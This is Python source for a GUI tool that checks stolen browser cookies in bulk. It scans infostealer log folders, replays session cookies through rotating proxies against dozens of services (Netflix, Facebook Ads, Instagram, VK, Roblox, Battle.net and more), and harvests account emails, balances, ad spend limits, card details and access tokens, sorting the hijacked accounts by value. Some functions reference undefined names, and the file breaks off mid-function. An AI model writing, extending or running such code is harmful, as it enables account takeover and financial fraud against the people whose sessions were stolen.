import datetime as DT
import glob
import http.client
import json
import os
import random
import re
import shutil
import socket
import sys
import threading
from PyQt5 import QAxContainer
import requests
from PyQt5 import QtWidgets
from PyQt5.QtCore import QThread, QTimer
from PyQt5.QtCore import pyqtSignal
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QFileDialog
from PyQt5.QtWidgets import QMessageBox
from bs4 import BeautifulSoup as bs
from wmi import WMI
from LoginCheked_UI import Ui_MainWindow
from jsoni_control import Config
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog, QTextEdit, QLabel
import LoginCheked_UI
import main_ui

checked = 0
yt_cookies = []
vk_cookies = []
VK_CHECKED = 0
YT_CHECKED = 0
INST_CHECKED = 0
AMAZON_CHECKED = 0
STEAM_CHECKED = 0
EPIC_CHECKED = 0
TWITCH_CHECKED = 0
http.client._MAXHEADERS = 1000000
proxies = None


class CheckThread(QThread):
    console_add_text = pyqtSignal(str)
    info_progress = pyqtSignal(int)
    progres_setup = pyqtSignal(int)

    def __init__(self):
        QThread.__init__(self)
        self.timer = QTimer()

    def err(e, exit=True):
        input(e)
        if exit:
            sys.exit()

    def get_path(self, path):
        new_path = ''
        counter = 0
        for i in path:
            if i == "\\":
                counter += 1
            if counter >= 2:
                break
            new_path += i
        return new_path

    def files_reader(self, logs):
        self.console_add_text.emit('Looking for cookies...')

        all_cooks = []

        for folder, subfolder, file in os.walk(logs):
            for filename in file:
                if filename.endswith('.txt'):
                    all_cooks += [os.path.join(folder, filename)]
        self.console_add_text.emit(f"Was it possible to find : {len(all_cooks)}")
        self.progres_setup.emit(len(all_cooks))
        return all_cooks

    def get_proxies_from_file(self, settings):
        global proxies
        try:
            with open(settings['settings']['proxies_file'], 'r', encoding='utf-8') as (pf):
                proxies = pf.read().splitlines()
            self.console_add_text.emit(f"Proxies are enabled, downloaded {len(proxies)} a proxy, like {settings['settings']['PROXY']}\n")
        except FileNotFoundError:
            self.console_add_text.emit(
                f"The proxy file was not found: {settings['settings']['proxies_file']} restart and select a file with a proxy or any TXT\n")
            self.err(f"file {settings['settings']['proxies_file']} not found")
        except Exception as e:
            self.err(f"get_proxies_from_file: {e}")

            pass

    def get_random_proxy(self, settings):
        random_proxy = random.choice(proxies)
        try:
            ip, port, username, password = random_proxy.split(':')
            return {'https': f"{settings['settings']['PROXY']}://{username}:{password}@{ip}:{port}"}
        except ValueError:
            return {'https': f"{settings['settings']['PROXY']}://{random_proxy}"}

    def save_cookies_yt(self, folder_name, cookie_name, channel_name, subscribers):
        global yt_cookies
        try:
            if channel_name not in yt_cookies:
                if os.path.exists(folder_name):
                    cookie_file = open(f'{cookie_name}', 'r', encoding='utf-8')
                    results = open(f'{folder_name}//{folder_name}_subscribers_{subscribers}_channel_{channel_name}.txt', 'w',
                                   encoding='utf-8')
                    results.write(f'{cookie_file.read()}')
                    results.close()
                    cookie_file.close()
                    yt_cookies.append(channel_name)
                else:
                    os.mkdir(folder_name)
                    cookie_file = open(f'{cookie_name}', 'r', encoding='utf-8')
                    results = open(f'{folder_name}//{folder_name}_subscribers_{subscribers}_channel_{channel_name}.txt', 'w',
                                   encoding='utf-8')
                    results.write(f'{cookie_file.read()}')
                    results.close()
                    cookie_file.close()
                    yt_cookies.append(channel_name)
        except:
            pass

    def save_cookies(self, folder_name, cookie_name):
        try:
            if os.path.exists(folder_name):
                cookie_file = open(f'{cookie_name}', 'r', encoding='utf-8')
                results = open(f'{folder_name}//{folder_name}{random.randint(1, 100000000)}.txt', 'w', encoding='utf-8')
                results.write(f'{cookie_file.read()}')
                results.close()
                cookie_file.close()
            else:
                os.mkdir(folder_name)
                cookie_file = open(f'{cookie_name}', 'r', encoding='utf-8')
                results = open(f'{folder_name}//{folder_name}{random.randint(1, 100000000)}.txt', 'w', encoding='utf-8')
                results.write(f'{cookie_file.read()}')
                results.close()
                cookie_file.close()
        except UnicodeDecodeError:
            try:
                if os.path.exists(folder_name):
                    cookie_file = open(f'{cookie_name}', 'r')
                    results = open(f'{folder_name}//{folder_name}{random.randint(1, 100000000)}.txt', 'w',
                                   encoding='utf-8')
                    results.write(f'{cookie_file.read()}')
                    results.close()
                    cookie_file.close()
                else:
                    os.mkdir(folder_name)
                    cookie_file = open(f'{cookie_name}', 'r')
                    results = open(f'{folder_name}//{folder_name}{random.randint(1, 100000000)}.txt', 'w',
                                   encoding='utf-8')
                    results.write(f'{cookie_file.read()}')
                    results.close()
                    cookie_file.close()
            except:
                pass
            pass

    def open_cookie_json(self, cookie_name, service):
        with open(cookie_name, "r") as read_file:
            data = json.load(read_file)
        cookie = {}
        for i in range(0, len(data)):
            try:
                if service in data[i]["domain"]:
                    cookie[data[i]["name"]] = f'{data[i]["value"]}'
            except:
                continue
        return cookie

    def select_useragent_mode(self, settings):
        if settings['settings']['USERAGENT'] == 2:
            global useragents
            try:
                with open(settings['settings']['useragents_file'], 'r', encoding='utf-8') as (pf):
                    useragents = pf.read().splitlines()
                self.console_add_text.emit(f'Uploaded {len(useragents)} user agents\n')
                return useragents
            except Exception as err:
                self.console_add_text.emit("Error loading the user agent, you may have entered an incorrect file name" + self.err)
        else:
            pass

    def net_to_cookie(self, filename, service):
        cookies = {}
        try:
            with open(filename, 'r', encoding='utf-8') as fp:
                for line in fp:
                    try:
                        if not re.match(r'^\#', line) and service in line:
                            lineFields = line.strip().split('\t')
                            cookies[lineFields[5]] = lineFields[6]
                    except Exception as err:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match(r'^\#', line) and service in line:
                            lineFields = line.strip().split('\t')
                            cookies[lineFields[5]] = lineFields[6]
                    except Exception as err:
                        continue
        return cookies

    def save_results(self, folder_name, file_name, text_to_insert):
        if os.path.exists(folder_name):
            results = open(f'{folder_name}\\{file_name}', 'a', encoding='utf-8')
            results.write(f'{text_to_insert}\n')
            results.close()
        else:
            os.mkdir(folder_name)
            results = open(f'{folder_name}\\{file_name}', 'a', encoding='utf-8')
            results.write(f'{text_to_insert}\n')
            results.close()

    def save_logs(self, folder_name, cookie_name, text_to_insert):
        try:
            if os.path.exists(folder_name):
                shutil.copytree(self.get_path(cookie_name), folder_name+"\\"+self.get_path(cookie_name).split("\\")[1])
                self.save_results(folder_name+"\\"+self.get_path(cookie_name).split("\\")[1],
                                  folder_name+"_checked_info.txt",
                                  f'{text_to_insert}\n\n')
            else:
                os.mkdir(folder_name)
                shutil.copytree(self.get_path(cookie_name), folder_name + "\\" + self.get_path(cookie_name).split("\\")[1])
                self.save_results(folder_name + "\\" + self.get_path(cookie_name).split("\\")[1],
                                  folder_name + "_checked_info.txt",
                                  f'{text_to_insert}\n\n')
        except Exception as err:
            print(err)
            pass

    def check_all(self, all_cooks, start, end, settings):
        global checked
        for i in range(start, end):
            try:
                if settings['services']['EPICGAMES'] == 2:
                    try:
                        self.check_epic(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['FREEBITCOIN'] == 2:
                    try:
                        self.check_free_bitcoin(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['FUNPAY'] == 2:
                    try:
                        self.check_funpay(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['VK'] == 2:
                    try:
                        self.check_vk(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['STEAM'] == 2:
                    try:
                        self.check_steam(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['YT'] == 2:
                    try:
                        self.check_youtube(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['BATTLE'] == 2:
                    try:
                        self.check_battlenet_games(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['INSTAGRAM'] == 2:
                    try:
                        self.check_instagram(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['FACEBOOK'] == 2:
                    try:
                        self.check_facebook_ads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['ROBLOX'] == 2:
                    try:
                        self.check_roblox(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['NETFLIX'] == 2:
                    try:
                        self.check_netflix(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['HUMBLE'] == 2:
                    try:
                        self.check_humble(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['COINBASE'] == 2:
                    try:
                        self.check_coinbase(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['AMAZON'] == 2:
                    try:
                        self.check_amazon(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['KRYPTEX'] == 2:
                    try:
                        self.check_kryptex(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['TIKTOK'] == 2:
                    try:
                        self.check_tiktok(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['PATHOFEXILE'] == 2:
                    try:
                        self.check_pathofexile(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['HITBTC'] == 2:
                    try:
                        self.check_hitbtc(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['DISCORD'] == 2:
                    try:
                        self.check_discord(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['BINGADS'] == 2:
                    try:
                        self.check_bingads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['SNAPCHATADS'] == 2:
                    try:
                        self.check_snapchatads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['SEMRUSH'] == 2:
                    try:
                        self.check_semrush(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['REDDITADS'] == 2:
                    try:
                        self.check_redditads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['TINDERADS'] == 2:
                    try:
                        self.check_tinderads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['MICROSOFTADS'] == 2:
                    try:
                        self.check_microsoftads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['CRAIGSLISTADS'] == 2:
                    try:
                        self.check_craigslistads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['AIRBNB'] == 2:
                    try:
                        self.check_airbnb(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['TWITTERADS'] == 2:
                    try:
                        self.check_twitterads(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['WALMART'] == 2:
                    try:
                        self.check_walmart(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['UBEREATS'] == 2:
                    try:
                        self.check_ubereats(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['ZILLOW'] == 2:
                    try:
                        self.check_zillow(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['FLIPKART'] == 2:
                    try:
                        self.check_flipkart(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['DHGATE'] == 2:
                    try:
                        self.check_dhgate(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['INSTACART'] == 2:
                    try:
                        self.check_instacart(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['ASHLEYMADISON'] == 2:
                    try:
                        self.check_ashleymadison(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['ZOOSK'] == 2:
                    try:
                        self.check_zoosk(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['CHRISTANMINGLE'] == 2:
                    try:
                        self.check_christanmingle(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['VINTED'] == 2:
                    try:
                        self.check_vinted(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['BOOKING'] == 2:
                    try:
                        self.check_booking(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['ZOOSK'] == 2:
                    try:
                        self.check_zoosk(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['TEMU'] == 2:
                    try:
                        self.check_temu(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['KICK'] == 2:
                    try:
                        self.check_kick(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['MYSPACE'] == 2:
                    try:
                        self.check_myspace(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['SNAPCHAT'] == 2:
                    try:
                        self.check_snapchat(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['TWITCH'] == 2:
                    try:
                        self.check_twitch(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['LOCALS'] == 2:
                    try:
                        self.check_locals(all_cooks[i], settings)
                    except:
                        pass
                if settings['services']['LINKEDIN'] == 2:
                    try:
                        self.check_linkedin(all_cooks[i], settings)
                    except:
                        pass
                checked += 1
                self.info_progress.emit(checked)
            except Exception as err:
                checked += 1
                self.info_progress.emit(checked)

                continue



    def conn(self, obj, url, cookies, settings, headers, params=None, json=None, data=None):
        connection_counter = 0
        if settings['settings']['PROXY'] != "off":
            while True:
                connection_counter += 1
                if connection_counter >= 15:
                    return None
                proxy = self.get_random_proxy(settings)
                if settings["settings"]["USERAGENT"] == 2:
                    headers_useragent = {'accept-language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'user-agent': random.choice(useragents)}
                    headers = dict(list(headers.items()) + list(headers_useragent.items()))


                else:
                    headers_useragent = {'accept-language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                   'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}
                    headers = dict(list(headers.items()) + list(headers_useragent.items()))

                try:
                    r = obj(url=url, headers=headers, params=params, data=data, cookies=cookies, proxies=proxy, json=json,timeout=5)
                    if r.status_code == 404:
                        return r
                    if r.status_code == 200:
                        return r
                except Exception as e:
                    try:
                        continue
                    finally:
                        e = None
                        del e
        else:
            if settings["settings"]["USERAGENT"] == 2:
                headers_useragent = {'accept-language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'user-agent': random.choice(useragents)}
                headers = dict(list(headers.items()) + list(headers_useragent.items()))
            else:
                headers_useragent = {'accept-language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                   'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}
                headers = dict(list(headers.items()) + list(headers_useragent.items()))

            r = obj(url=url, headers=headers, params=params, data=data, cookies=cookies)
            return r

    def check_netflix(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'netflix')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url="https://www.netflix.com/YourAccount", cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                plan = soup.find('div', attrs={'data-uia': "plan-label"}).find('b').text

                email = soup.find('div', attrs={'class': 'account-section-item account-section-email'}).text
                self.save_results('Netflix', 'netflix.txt', f'email - {email} || Plan - {plan}\nCookie:{cookie_name}')
                if settings['settings']['save_netflix_logs'] == 1:
                    self.save_logs('Netflix', cookie_name, f'email - {email} || Plan - {plan}\nCookie:{cookie_name}')
                self.console_add_text.emit(f'Netflix\nemail - {email} || Plan - {plan}\nCookie:{cookie_name}')
            except Exception as err:
                self.console_add_text.emit(self.err)
                pass

    def check_roblox(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'roblox')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://www.roblox.com/home', cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                id = soup.find('meta', attrs={'name': "user-data"}).get('data-userid')
                r = self.conn(obj=session.get, url=f'https://economy.roblox.com/v1/users/{id}/currency', cookies=cookie, settings=settings, headers={})
                robux = r.json()['robux']
                self.console_add_text.emit(f'ROBUX: {robux} || Cookie:{cookie_name}')
                self.save_results('Roblox', 'roblox.txt', f'ROBUX: {robux} || Cookie:{cookie_name}')
                if settings['settings']['save_roblox_logs'] == 1:
                    self.save_logs('Roblox', cookie_name, f'ROBUX: {robux} || Cookie:{cookie_name}')
            except:
                pass

    def check_facebook(self, cookie_name, settings):
          try:
              cookie = self.net_to_cookie(cookie_name, 'facebook')
          except:
              cookie = {}
          if len(cookie) > 1:
              try:
                  session = requests.Session()
                  r = self.conn(obj=session.get, url="https://www.facebook.com/settings", cookies=cookie, settings=settings, headers={})
                  soup = bs(r.text, 'html.parser')
                  name = soup.find('span', attrs={'class': "_1vp5"}).text
                  self.console_add_text.emit('Facebook valid session!')
                  print('Facebook valid session!')
                  self.save_results('Facebook', 'Facebook.txt', f'Valid session facebook:{cookie_name}')
                  if settings['settings']['save_facebook_logs'] == 1:
                      self.save_logs('Facebook', cookie_name, f'Valid session facebook:{cookie_name}')
                  self.check_facebook_ads(cookie_name, settings)
              except Exception as err:
                  print(err)
                  pass

    def check_facebook_ads(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'facebook')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                session.max_redirects = 500
                text = ''
                folder_name = ''
                account_status = {1: 'ACTIVE',
                                  2: 'DISABLED',
                                  3: 'UNSETTLED',
                                  7: 'PENDING_RISK_REVIEW',
                                  8: 'PENDING_SETTLEMENT',
                                  9: 'IN_GRACE_PERIOD',
                                  100: 'PENDING_CLOSURE',
                                  101: 'CLOSED',
                                  201: 'ANY_ACTIVE',
                                  202: 'ANY_CLOSED'}
                r = self.conn(obj=session.get, url="https://www.facebook.com/adsmanager/manage/campaigns?", cookies=cookie, settings=settings, headers={})
                comp_id = r.text.split("campaigns?act=")[1]
                print("XYI FB")
                comp_id = comp_id.split('")')[0]

                r = self.conn(obj=session.get, url=f'https://www.facebook.com/adsmanager/manage/campaigns?act={comp_id}', cookies=cookie, settings=settings, headers={})
                token = r.text.split('<script>(function(){window.__accessToken="')[1]
                token = token.split('";')[0]

                r = self.conn(obj=session.get, url='https://graph.facebook.com/v7.0/me/adaccounts?access_token=' + token + '&__activeScenarioIDs=[]&__activeScenarios=[]&_app=ADS_MANAGER&_reqName=me/adaccounts&_reqSrc=AdsTypeaheadDataManager&_sessionID=7d75da9daba73610&fields=["account_id","account_status","is_direct_deals_enabled","modeled_reporting_type","business{id,name}","viewable_business{id,name}","name"]&filtering=[]&include_headers=false&limit=100&locale=en_US&method=get&pretty=0&sort=name_ascending&suppress_http_code=1&xref=f313a96358273b2', cookies=cookie, settings=settings, headers={})
                data = r.json()
                account_ids = [x['account_id'] for x in data['data']]
                account_status_list = [x['account_status'] for x in data['data']]
                for i in range(len(account_ids)):
                    r = self.conn(obj=session.get,url=f'https://www.facebook.com/adsmanager/manage/campaigns?act={account_ids[i]}', cookies=cookie, settings=settings, headers={})
                    try:
                        bus_id = r.text.split('business_id=')[1]
                        bus_id = bus_id.split('")')[0]
                    except:
                        bus_id = ''
                    r = self.conn(obj=session.get, url='https://graph.facebook.com/v7.0/act_' + account_ids[
                        i] + '?access_token=' + token + '&__business_id=' + bus_id + '&_reqName=adaccount&_reqSrc=AdsCMPaymentsAccountDataDispatcher&_sessionID=f8e4e7df18e1486&fields=["active_billing_date_preference{day_of_month,id,next_bill_date,time_created,time_effective}","can_pay_now","can_repay_now","current_unbilled_spend","extended_credit_info","is_br_entity_account","has_extended_credit","max_billing_threshold","min_billing_threshold","min_payment","next_bill_date","pending_billing_date_preference{day_of_month,id,next_bill_date,time_created,time_effective}","promotion_progress_bar_info","show_improved_boleto","business{id,name,payment_account_id}","total_prepay_balance","is_in_middle_of_local_entity_migration","is_in_3ds_authorization_enabled_market","current_unpaid_unrepaid_invoice","has_repay_processing_invoices"]&include_headers=false&locale=en_US&method=get&pretty=0&suppress_http_code=1&xref=f2540984bdf647c', cookies=cookie, settings=settings, headers={})
                    data = r.json()
                    try:
                        r = self.conn(obj=session.get, url='https://graph.facebook.com/v3.1/me/adaccounts?fields=name,ads.limit(500)%7Bstatus,effective_status,delivery_info,configured_status,bid_info,name,ad_review_feedback,adlabels,created_time,recommendations,updated_time,insights.limit(500)%7Bresults,relevance_score%7D,adcreatives.limit(500)%7Bimage_crops,image_url,status,thumbnail_url%7D%7D,account_status,disable_reason,reachfrequencypredictions%7Bstatus,reservation_status,campaign_time_stop,campaign_time_start,story_event_type%7D,age,end_advertiser_name,amount_spent,spend_cap,balance,adtrust_dsl,current_unbilled_spend&limit=500&locale=ru_RU&access_token=' + token, cookies=cookie, settings=settings, headers={})
                        data_amount_spent = r.json()
                        amount_spent = f'{data_amount_spent["data"][0]["amount_spent"]}'
                        adtrust_dsl = f'{data_amount_spent["data"][0]["adtrust_dsl"]}'
                        current_unbilled_spend_amount = f'{data_amount_spent["data"][0]["current_unbilled_spend"]["amount"]}'
                        current_unbilled_spend_currency = f'{data_amount_spent["data"][0]["current_unbilled_spend"]["currency"]}'
                    except:
                        amount_spent = '?'
                    try:
                        r = self.conn(obj=session.get, url='https://graph.facebook.com/v7.0/act_' + account_ids[i] + '?access_token=' + token + '&_reqName=adaccount&_reqSrc=AdsPaymentMethodsDataLoader&_sessionID=552f4655aa06118e&fields=["all_payment_methods{payment_method_altpays{account_id,country,credential_id,display_name,image_url,instrument_type,network_id,payment_provider,title},pm_credit_card{account_id,credential_id,credit_card_address,credit_card_type,display_string,exp_month,exp_year,first_name,is_verified,last_name,middle_name,time_created,need_3ds_authorization,supports_recurring_in_india,verify_card_behavior},payment_method_direct_debits{account_id,address,can_verify,credential_id,display_string,first_name,is_awaiting,is_pending,last_name,middle_name,status,time_created},payment_method_extended_credits{account_id,balance,credential_id,max_balance,type,partitioned_from,sequential_liability_amount},payment_method_paypal{account_id,credential_id,email_address,time_created},payment_method_stored_balances{account_id,balance,credential_id,total_fundings},payment_method_tokens{account_id,credential_id,current_balance,original_balance,time_created,time_expire,type}}"]&include_headers=false&locale=ru_RU&method=get&pretty=0&suppress_http_code=1&xref=f17ca7e607e089c', cookies=cookie, settings=settings, headers={})
                        datas = r.json()
                        try:
                            country_code = datas["all_payment_methods"]["pm_credit_card"]["data"][0]["credit_card_address"]["country_code"]
                        except:
                            country_code = 'XZ'
                        text += f'Card Country: : {country_code}\n' \
                                f'{datas["all_payment_methods"]["pm_credit_card"]["data"][0]["display_string"]}::{datas["all_payment_methods"]["pm_credit_card"]["data"][0]["exp_month"]}/{datas["all_payment_methods"]["pm_credit_card"]["data"][0]["exp_year"]}\n'
                        text += "\nTOKEN: " + token

                    except Exception as err:
                        text = ''
                    main_f_name = self.get_path(cookie_name).split('\\')[1]
                    folder_name += f"({current_unbilled_spend_amount}_{current_unbilled_spend_currency}_{account_status[account_status_list[i]]}_{amount_spent}_LIMIT_{adtrust_dsl})_"
                folder_name += main_f_name
                if not os.path.exists('fb_ads'):
                    os.mkdir('fb_ads')
                self.save_logs(f'fb_ads\\{folder_name}', cookie_name, f'{folder_name}')
                self.save_results(f'fb_ads\\{folder_name}', 'Account info.txt', text)
                self.console_add_text.emit(f'Facebook ||  {cookie_name}')

            except Exception as err:
                print(err)
                pass

    def check_funpay(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'funpay')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url="https://funpay.ru/account/balance", cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                balance = soup.find('span', attrs={'class': "balances-list"}).text
                transactions = soup.find_all('div', attrs={'class': 'tc-item transaction-status-complete'})
                self.console_add_text.emit(f'Funpay || Balance: {balance} || Transactions: {len(transactions)}')

                self.save_results('Funpay', 'Funpay.txt',
                                  f'Funpay || Balance: {balance} || Transaction s: {len(transactions)}\nCookie:{cookie_name}')
                if settings['settings']['save_funpay_logs'] == 1:
                    self.save_logs('Funpay', cookie_name,
                                   f'Funpay || Balance: {balance} || Transactions: {len(transactions)}\nCookie:{cookie_name}')
                if settings['cookies']['funpay'] == 1:
                    self.save_cookies('Funpay_cookies', cookie_name)
            except:
                pass

    def check_vk(self, cookie_name, settings):
        global vk_cookies
        try:
            cookie = self.net_to_cookie(cookie_name, 'vk')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                group_info = ''
                subs_count = 0
                r = self.conn(obj=session.get, url="https://vk.com/id0", cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                friends = soup.find('a', attrs={'class': "page_counter"}).find_next('div', attrs={
                    'class': 'count'}).text
                subs = soup.find_all('a', attrs={'class': 'page_counter'})[1].find_next('div',
                                                                                        attrs={'class': 'count'}).text
                url = soup.find('a', attrs={'class': 'module_header'}).get('href')
                if friends != None:
                    self.console_add_text.emit(
                        f'PROFILE URL - https://vk.com/id{url.replace("/gifts", "")} || Friends - {friends} || Subscribers - {subs} ||Cookie:{cookie_name}\n\n')

                    self.save_results('VK', 'VK.txt',
                                      f'PROFILE URL - https://vk.com/id{url.replace("/gifts", "")} || friends - {friends} || subscribers - {subs} || Cookie:{cookie_name}')
                    if settings['settings']['save_vk_logs'] == 1:
                        self.save_logs('VK', cookie_name,
                                       f'PROFILE URL - https://vk.com/id{url.replace("/gifts", "")} || Друзей - {friends} || Подписчиков - {subs} ||Cookie:{cookie_name}')
                    r = self.conn(obj=session.get, url='https://vk.com/groups?tab=admin', cookies=cookie, settings=settings, headers={})
                    soup = bs(r.text, 'html.parser')
                    try:
                        groups = soup.find_all('div', attrs={'id': 'groups_list_admin'})[0]
                        for i in groups:
                            group_url = i.find('a', attrs={'class': 'group_row_photo'})
                            group_sub = i.find_all('div', attrs={'class': 'group_row_labeled'})[-1].text
                            group_info += f"{group_url.get('href')} => {group_sub}\n"
                            subs_count += int(group_sub.split(' ')[0])
                        if subs_count > 20:
                            self.save_logs('VK\\VK_groups', cookie_name, group_info)
                            group_info += f'\n{cookie_name}\n'
                            self.save_results('VK\\VK_groups',
                                              f'{subs_count}Subscribers_Of_vk_{random.randint(1, 10000000)}.txt',
                                              group_info)
                    except:
                        pass

                if settings['cookies']['vk'] == 1:
                    self.save_cookies('VK_Cookies', cookie_name)
                if settings['other']['save_vk_tokens'] == 1:
                    self.get_vk_token(cookie, settings)
            except Exception as err:
                pass

    def check_instagram(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'instagram')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url="https://www.instagram.com/", cookies=cookie, settings=settings, headers={})
                html = r.text.split('window._sharedData = ')[1]
                html = html.split(';</script>')[0]
                data = json.loads(html)
                profile_url = f"https://www.instagram.com/{data['config']['viewer']['username']}"
                number_verif = data['config']['viewer']['has_phone_number']
                r = self.conn(obj=session.get, url=profile_url, cookies=cookie, settings=settings, headers={})
                html = r.text.split('window._sharedData = ')[1]
                html = html.split(';</script>')[0]
                data = json.loads(html)
                subs_count = data['entry_data']['ProfilePage'][0]['graphql']['user']['edge_followed_by']['count']
                follow = data['entry_data']['ProfilePage'][0]['graphql']['user']['edge_follow']['count']
                self.console_add_text.emit(
                    f'Instagram\nPROFILE URL - {profile_url} || PHONE_VERIF - {number_verif} || SUBSCRIBERS - {subs_count}\n FOLOLOW - {follow}\nCookie:{cookie_name}\n\n{"=" * 30}\n')
                if not os.path.exists('Instagram'):
                    os.mkdir('Instagram')
                if settings['cookies']['instagram'] == 1:
                    self.save_cookies('Instagram_cookies', cookie_name)
                if int(subs_count) > int(settings['save_filters']['inst_min_subs']):
                    path_to_save = f"Instagram\\Instagram_{settings['save_filters']['inst_min_subs']}"
                    self.save_results(path_to_save, 'Instagram.txt',
                                      f'PROFILE URL - {profile_url} || PHONE_VERIF - {number_verif} || SUBSCRIBERS - {subs_count}\nCookie:{cookie_name}\n{"=" * 30}')
                else:
                    path_to_save = 'Instagram'
                self.save_results(path_to_save, 'Instagram.txt',
                                  f'PROFILE URL - {profile_url} || PHONE_VERIF - {number_verif} || SUBSCRIBERS - {subs_count}\nCookie:{cookie_name}\n{"=" * 30}')
                if settings['settings']['save_instagram_logs'] == 1:
                    self.save_logs(path_to_save, cookie_name,
                                   f'PROFILE URL - {profile_url} || PHONE_VERIF - {number_verif} || SUBSCRIBERS - {subs_count}\nCookie:{cookie_name}\n{"=" * 30}')

            except Exception as err:
                pass

    def check_battlenet(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'battle')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url=url_settings['services']['battlenet'], cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                auth = soup.find('div', attrs={'class': "Navbar-label Navbar-accountAuthenticated"}).text
                self.save_results('BattleNet', 'BattleNet.txt', f'valid Cookie:{cookie_name}')
                if settings['settings']['save_battlenet_logs'] == 1:
                    self.save_logs('BattleNet', cookie_name, f'valid Cookie:{cookie_name}')
            except Exception as err:
                pass

    def check_battlenet_games(self, cookie_name, settings):
        global url_settings
        try:
            cookie = self.net_to_cookie(cookie_name, 'battle')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                if not os.path.exists('Battlenet_full'):
                    os.mkdir('Battlenet_full')
                if not os.path.exists('Battlenet_full\\WithPurchases'):
                    os.mkdir('Battlenet_full\\WithPurchases')
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://account.blizzard.com/oauth2/authorization/account-settings?ref=/transactions', cookies=cookie, settings=settings, headers={})
                r = self.conn(obj=session.get, url='https://eu.battle.net/oauth/authorize?response_type=code&client_id=057adb2af62a4d59904f74754838c4c8&scope=account.full commerce.virtualcurrency.full commerce.virtualcurrency.basic&state=eyJzdGF0ZUVudHJvcHkiOiJLUkJXVXdkWk5zRjM2VG1OT3RTQjhodWJxSDJCN3BCWlRWYzM4OEk5LWM4PSIsInJlZmVycmVyIjoiL3RyYW5zYWN0aW9ucyJ9&redirect_uri=https://account.blizzard.com/login/oauth2/code/account-settings&registration_id=account-settings', cookies=cookie, settings=settings, headers={})
                r = self.conn(obj=session.get, url='https://account.blizzard.com/api/transactions?regionId=2', cookies=cookie, settings=settings, headers={})
